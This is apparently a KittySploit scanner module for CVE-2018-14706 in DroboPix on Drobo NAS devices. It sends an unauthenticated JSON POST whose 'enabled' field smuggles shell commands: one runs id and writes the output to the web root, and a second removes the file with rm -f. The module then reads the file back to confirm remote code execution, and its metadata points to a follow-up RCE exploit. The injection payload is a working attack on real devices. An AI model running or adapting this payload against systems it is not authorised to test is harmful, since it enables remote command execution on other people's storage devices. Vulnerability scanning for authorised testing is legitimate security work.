#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""DroboPix demo API command injection (CVE-2018-14706)."""

import re
import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'DroboPix - demo API Command Injection Detection (CVE-2018-14706)',
        'description': (
            'Detects DroboPix RCE by injecting into /DroboPix/api/drobopix/demo JSON '
            'enabled field, writing id output under /DroboPix/<token>, then reading it.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2018', 'drobo', 'nas', 'rce', 'cmdi',
            'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 3,
            'reversible': False,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.2,
            'noise': 0.5,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [
                    'exploits/linux/http/drobo_cve_2018_14706_rce',
                ],
            },
        },
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2018-14706'],
        'cve': 'CVE-2018-14706',
    }

    def run(self):
        name = secrets.token_hex(6)
        path = '/DroboPix/api/drobopix/demo'
        data = (
            '{"enabled":"false";/usr/bin/id > '
            f'/mnt/DroboFS/Shares/DroboApps/DroboPix/www/{name} #"}}'
        )
        self.http_request(
            method='POST',
            path=path,
            data=data,
            headers={'Content-Type': 'application/json'},
            allow_redirects=False,
        )
        r = self.http_request(method='GET', path=f'/DroboPix/{name}', allow_redirects=False)
        cleanup = (
            '{"enabled":"false";/bin/rm -f '
            f'/mnt/DroboFS/Shares/DroboApps/DroboPix/www/{name} #"}}'
        )
        self.http_request(
            method='POST',
            path=path,
            data=cleanup,
            headers={'Content-Type': 'application/json'},
            allow_redirects=False,
        )
        if r and re.search(r'uid=\d+', r.text or ''):
            self.set_info(
                severity='critical',
                reason='DroboPix demo API command injection (CVE-2018-14706)',
                path=path,
            )
            return True
        return False
